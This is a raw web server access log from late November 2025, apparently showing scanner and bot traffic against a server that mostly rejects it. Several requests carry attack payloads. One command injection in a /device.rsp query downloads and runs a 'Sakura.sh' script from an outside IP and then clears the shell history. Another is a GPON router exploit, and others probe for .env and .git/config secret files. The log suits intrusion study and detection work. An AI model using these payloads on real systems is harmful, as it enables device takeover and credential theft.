74.7.242.55 - - [22/Nov/2025:19:15:40 +0000] "GET / HTTP/2.0" 403 153 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.3; +https://openai.com/gptbot)" "-"
204.76.203.212 - - [22/Nov/2025:19:25:40 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
78.135.107.199 - - [22/Nov/2025:19:27:39 +0000] "GET /admin/config.php HTTP/1.0" 404 153 "-" "xfa1" "-"
218.248.63.29 - - [22/Nov/2025:19:34:20 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 153 "-" "Hello, World" "-"
218.248.63.29 - - [22/Nov/2025:19:34:23 +0000] "0;sh+/tmp/gpon80&ipv=0" 400 157 "-" "-" "-"
179.43.191.19 - - [22/Nov/2025:19:45:58 +0000] "GET /tr/ HTTP/1.1" 403 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0" "-"
5.187.35.21 - - [22/Nov/2025:20:08:50 +0000] "PROPFIND / HTTP/1.1" 403 153 "http://175.202.19.10:443/" "-" "-"
185.242.226.123 - - [22/Nov/2025:20:09:53 +0000] "GET / HTTP/1.1" 400 657 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36" "-"
185.243.96.135 - - [22/Nov/2025:20:33:38 +0000] "GET /RDWeb/Pages/ HTTP/1.1" 403 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "-"
5.182.50.208 - - [22/Nov/2025:20:47:28 +0000] "GET / HTTP/1.1" 403 153 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0" "-"
87.120.191.124 - - [22/Nov/2025:20:47:45 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
204.76.203.212 - - [22/Nov/2025:20:53:41 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
196.196.53.109 - - [22/Nov/2025:20:53:48 +0000] "GET / HTTP/1.1" 400 255 "-" "WanScannerBot/1.1" "-"
196.196.53.109 - - [22/Nov/2025:20:53:49 +0000] "\x10\x17\x00\x04MQTT\x05\x02\x00<\x00\x00" 400 157 "-" "-" "-"
196.196.53.109 - - [22/Nov/2025:20:53:49 +0000] "\x00\x00\x00\x08\x04\xD2\x16/" 400 157 "-" "-" "-"
196.196.53.109 - - [22/Nov/2025:20:53:49 +0000] "\x12\x01\x00/\x00\x00\x02\x00\x00\x00\x1A\x00\x06\x01\x00 \x00\x01\x02\x00!\x00\x01\x03\x00\x22\x00\x04\x04\x00&\x00\x01\xFF\x00\x00\x00\x00\x00\x00\xFF\x00\x00\x00\x00\x00\x00" 400 157 "-" "-" "-"
196.196.53.109 - - [22/Nov/2025:20:53:49 +0000] "\x00\x00\x00f\xFESMB@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00\x01\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x02" 400 157 "-" "-" "-"
196.196.53.109 - - [22/Nov/2025:20:53:49 +0000] "SSH-2.0-Go" 400 157 "-" "-" "-"
196.196.53.109 - - [22/Nov/2025:20:53:49 +0000] "AMQP\x00\x00\x09\x01" 400 157 "-" "-" "-"
43.130.139.177 - - [22/Nov/2025:21:01:50 +0000] "GET / HTTP/1.1" 400 255 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
151.241.122.35 - - [22/Nov/2025:21:02:04 +0000] "HEAD / HTTP/1.1" 403 0 "-" "Go-http-client/1.1" "-"
43.166.247.82 - - [22/Nov/2025:21:04:55 +0000] "GET / HTTP/1.1" 403 153 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
83.142.209.125 - - [22/Nov/2025:21:13:27 +0000] "GET /login.rsp HTTP/1.1" 404 153 "-" "Hello World" "-"
213.209.143.49 - - [22/Nov/2025:21:38:37 +0000] "GET / HTTP/1.0" 403 153 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0" "-"
78.135.107.199 - - [22/Nov/2025:21:53:55 +0000] "GET /robots.txt HTTP/1.1" 404 153 "-" "Mozilla/5.0" "-"
176.65.149.253 - - [22/Nov/2025:22:00:31 +0000] "GET /backend/.env HTTP/1.0" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" "-"
213.209.143.49 - - [22/Nov/2025:22:06:44 +0000] "GET / HTTP/1.0" 403 153 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0" "-"
204.76.203.212 - - [22/Nov/2025:22:19:36 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
165.154.226.51 - - [22/Nov/2025:22:27:58 +0000] "GET / HTTP/1.1" 400 657 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" "-"
68.183.110.23 - - [22/Nov/2025:22:28:04 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" "-"
176.65.148.16 - - [22/Nov/2025:22:47:26 +0000] "GET /index.htm HTTP/1.1" 404 153 "-" "Mozilla/5.0" "-"
176.65.148.16 - - [22/Nov/2025:22:47:27 +0000] "GET / HTTP/1.1" 403 153 "-" "-" "-"
176.65.148.16 - - [22/Nov/2025:22:47:28 +0000] "\x16\x03\x01\x05\xAC\x01\x00\x05\xA8\x03\x03\xBB\xF9\xA4\xD8\xEF\xA3m\x8C\x88,\xA4G\x0E\xCAc\xD5\x14\xBAa7\xEA\x88\xFEU\x1D\xCA\xD8\x0E\x06m\x94L \x97\xE2\xBF\xAE\xCAb\x16\xAB\xDE\xFE\xF4@" 400 157 "-" "-" "-"
176.65.148.16 - - [22/Nov/2025:22:47:35 +0000] "1111\x88\x00\x00\x00\x01\x01\x00\x00\x00%\xAD\x11>" 400 157 "-" "-" "-"
176.65.148.16 - - [22/Nov/2025:22:47:36 +0000] "1111\x0C\x01\x00\x00\x04\x00\x00\x01\x1B\x09\x00\x00\x02\x01\x00\x00\xFC\x00\x00\x00admin\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00queryBasicCfg\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00<?xml version=\x221.0\x22 encoding=\x22UTF-8\x22?>" 400 157 "-" "-" "-"
5.187.35.21 - - [22/Nov/2025:22:56:12 +0000] "GET / HTTP/1.1" 403 153 "-" "-" "-"
167.94.146.62 - - [22/Nov/2025:23:05:50 +0000] "GET / HTTP/1.1" 403 153 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
167.94.146.62 - - [22/Nov/2025:23:05:50 +0000] "PRI * HTTP/2.0" 400 157 "-" "-" "-"
167.94.146.62 - - [22/Nov/2025:23:05:54 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xED\x93\xBFg\xC7\x88\xE7\x00\xC5I\xDCC\xEBZ\x93\xEFP\x1FD^\x13ruT\xE0\x8B\xA8\xCC\x9F\xBC.] t{\xC7-\x0C\xF3\xC5\xD5iM^\xB9\x81\x98\xD4\xD6\x09\xF6JTU5T\x98\xC0P$|\xDE\xB8\xBA\x22\x00&\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-" "-"
167.94.146.62 - - [22/Nov/2025:23:05:55 +0000] "GET /login HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
167.94.146.62 - - [22/Nov/2025:23:05:59 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xD44\xC4B<#W\xF5\xA1\xA8\xAE\x1B\xAA\xC6\x1A\xDB\xED\x96\x9A c\xA8\x0E\xD3\x0F\xC5\xE4\x8AT\x02\xE2\xC7 \xCA\x9F\x88\xD7^\x0C\x07\xE8\x0Ek2rb\x99\x03H\x10\xDA_W\xE6\xDE\x09\xE1\x07\xE1<%\xD2\xEF\xF9m\x00&\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-" "-"
45.135.193.9 - - [22/Nov/2025:23:19:28 +0000] "GET http://ip-api.com/json/ HTTP/1.1" 404 153 "-" "Go-http-client/1.1" "-"
204.76.203.212 - - [22/Nov/2025:23:45:04 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
47.121.210.129 - - [22/Nov/2025:23:48:04 +0000] "GET /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=uname%20-a;cd+%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3B+wget+http%3A%2F%2F146.103.53.43%2FSakura.sh%3B+chmod+777+%2A%3B+sh+Sakura.sh%3B+rm+-rf+%2A.sh%3B+history+-c HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36" "-"
64.227.87.174 - - [22/Nov/2025:23:55:28 +0000] "GET /owa/auth/errorFE.aspx?httpCode=500 HTTP/2.0" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
64.227.87.174 - - [22/Nov/2025:23:55:28 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/2.0" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
64.227.87.174 - - [22/Nov/2025:23:55:28 +0000] "GET /owa/auth/logon.aspx HTTP/2.0" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
67.205.164.120 - - [22/Nov/2025:23:55:52 +0000] "GET / HTTP/2.0" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
93.174.93.12 - - [22/Nov/2025:23:55:54 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 157 "-" "-" "-"
50.116.9.173 - - [22/Nov/2025:23:56:30 +0000] "GET /version HTTP/2.0" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
50.116.9.173 - - [22/Nov/2025:23:56:30 +0000] "GET /api/v1/pods HTTP/2.0" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
159.89.132.103 - - [22/Nov/2025:23:56:51 +0000] "GET / HTTP/2.0" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
165.227.197.237 - - [22/Nov/2025:23:57:11 +0000] "POST /v1/statement HTTP/1.1" 403 153 "-" "python-urllib3/2.5.0" "-"
45.79.150.107 - - [22/Nov/2025:23:57:29 +0000] "GET /dana-na/nc/nc_gina_ver.txt HTTP/2.0" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
45.79.150.107 - - [22/Nov/2025:23:57:30 +0000] "GET /dana-cached/hc/HostCheckerInstaller.osx HTTP/2.0" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
45.148.10.247 - - [22/Nov/2025:23:57:31 +0000] "GET /.git/config HTTP/1.1" 400 255 "-" "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
45.148.10.247 - - [22/Nov/2025:23:57:33 +0000] "GET / HTTP/1.1" 403 153 "-" "-" "-"
45.148.10.247 - - [22/Nov/2025:23:57:35 +0000] "GET / HTTP/1.1" 400 255 "-" "-" "-"
173.255.229.76 - - [22/Nov/2025:23:57:50 +0000] "GET /RDWeb HTTP/2.0" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
173.255.229.76 - - [22/Nov/2025:23:57:50 +0000] "GET / HTTP/2.0" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
173.255.229.76 - - [22/Nov/2025:23:57:51 +0000] "GET /Remote HTTP/2.0" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
173.255.229.76 - - [22/Nov/2025:23:57:51 +0000] "GET /RDWeb/Pages/en-US/login.aspx HTTP/2.0" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
139.177.206.190 - - [22/Nov/2025:23:58:08 +0000] "POST /wsman HTTP/2.0" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
172.105.158.35 - - [22/Nov/2025:23:58:54 +0000] "GET / HTTP/2.0" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
172.105.158.35 - - [22/Nov/2025:23:58:55 +0000] "GET /auth.html HTTP/2.0" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
172.105.158.35 - - [22/Nov/2025:23:58:56 +0000] "GET /auth1.html HTTP/2.0" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
172.105.158.35 - - [22/Nov/2025:23:58:56 +0000] "GET /sslvpnLogin.html HTTP/2.0" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
172.105.158.35 - - [22/Nov/2025:23:58:57 +0000] "GET /api/sonicos/auth HTTP/2.0" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
172.105.158.35 - - [22/Nov/2025:23:58:57 +0000] "GET /api/sonicos/tfa HTTP/2.0" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
23.92.30.226 - - [22/Nov/2025:23:59:17 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36" "-"
23.92.30.226 - - [22/Nov/2025:23:59:17 +0000] "GET /favicon.ico HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36" "-"
23.92.30.226 - - [23/Nov/2025:00:02:23 +0000] "GET / HTTP/2.0" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36" "-"
45.33.96.63 - - [23/Nov/2025:00:13:11 +0000] "\x16\x03\x00\x00S\x01\x00\x00O\x03\x00?G\xD7\xF7\xBA,\xEE\xEA\xB2`~\xF3\x00\xFD\x82{\xB9\xD5\x96\xC8w\x9B\xE6\xC4\xDB<=\xDBo\xEF\x10n\x00\x00(\x00\x16\x00\x13\x00" 400 157 "-" "-" "-"
20.65.154.175 - - [23/Nov/2025:00:23:18 +0000] "GET /manager/text/list HTTP/1.1" 400 255 "-" "Mozilla/5.0 zgrab/0.x" "-"
87.120.191.124 - - [23/Nov/2025:00:39:33 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
5.187.35.21 - - [23/Nov/2025:00:53:45 +0000] "GET / HTTP/1.1" 403 153 "-" "-" "-"
185.242.226.114 - - [23/Nov/2025:00:54:07 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36" "-"
149.50.96.133 - - [23/Nov/2025:00:55:16 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36" "-"
100.24.34.255 - - [23/Nov/2025:01:01:47 +0000] "GET /favicon.ico HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
45.156.129.44 - - [23/Nov/2025:01:03:30 +0000] "GET /sitecore/shell/sitecore.version.xml HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" "-"
35.203.210.65 - - [23/Nov/2025:01:04:40 +0000] "GET / HTTP/1.1" 403 153 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity" "-"
13.219.78.63 - - [23/Nov/2025:01:06:11 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
20.12.240.188 - - [23/Nov/2025:01:12:51 +0000] "GET / HTTP/1.1" 403 153 "-" "Mozilla/5.0 zgrab/0.x" "-"
204.76.203.212 - - [23/Nov/2025:01:17:25 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
18.208.146.82 - - [23/Nov/2025:01:18:15 +0000] "GET /robots.txt HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
34.230.74.23 - - [23/Nov/2025:01:18:20 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
149.50.96.133 - - [23/Nov/2025:01:21:20 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36" "-"
43.158.91.71 - - [23/Nov/2025:02:00:49 +0000] "GET / HTTP/1.1" 403 153 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
199.45.155.90 - - [23/Nov/2025:02:18:11 +0000] "GET / HTTP/1.1" 403 153 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
199.45.155.90 - - [23/Nov/2025:02:18:20 +0000] "GET /sitemap.xml HTTP/1.1" 403 153 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
78.153.140.177 - - [23/Nov/2025:02:26:44 +0000] "GET /.env HTTP/1.1" 404 153 "-" "Mozilla/5.0(Linux/3.4.5; U; Android 4.4.2; zh-cn; Lenovo A536 Build/KOT49H)AppleWebKit/534.30 (KHTML, like Gecko) Version/4.4.2 Mobile Safari/534.30 Release/01.17.2014" "-"
78.153.140.177 - - [23/Nov/2025:02:26:45 +0000] "GET /api/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/85.8.2 (KHTML, like Gecko) Safari/85.8" "-"
78.153.140.177 - - [23/Nov/2025:02:26:45 +0000] "GET /backend/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10" "-"
78.153.140.177 - - [23/Nov/2025:02:26:46 +0000] "GET /admin/.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LGL16C/V100 Build/KOT49I.L16CV11a) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Mobile Safari/537.36" "-"
78.153.140.177 - - [23/Nov/2025:02:26:47 +0000] "GET /.env.example HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36 OPR/45.0.2552.635" "-"
78.153.140.177 - - [23/Nov/2025:02:26:48 +0000] "GET /app_dev.php/_profiler/phpinfo HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13(KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13" "-"
78.153.140.177 - - [23/Nov/2025:02:26:48 +0000] "GET /?phpinfo=-1 HTTP/1.1" 403 153 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0" "-"
78.153.140.177 - - [23/Nov/2025:02:26:49 +0000] "GET /Media/.env HTTP/1.1" 404 153 "-" "Mozilla/4.0 (compatible; MSIE 5.0; Windows 2000) Opera 6.0  [en]" "-"
78.153.140.177 - - [23/Nov/2025:02:26:58 +0000] "GET /Demo/.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Linux; Android 4.4.2; en-gb; SAMSUNG SM-T230 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Safari/537.36" "-"
78.153.140.177 - - [23/Nov/2025:02:27:01 +0000] "GET /.ENV HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Linux; Android 7.1.2; LM-X210(G) Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36" "-"
78.153.140.177 - - [23/Nov/2025:02:27:03 +0000] "GET /items/.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36" "-"
78.153.140.177 - - [23/Nov/2025:02:27:03 +0000] "GET /club/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8" "-"
78.153.140.177 - - [23/Nov/2025:02:27:04 +0000] "GET /.env~ HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; CrOS armv7l 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36" "-"
204.76.203.212 - - [23/Nov/2025:02:32:02 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
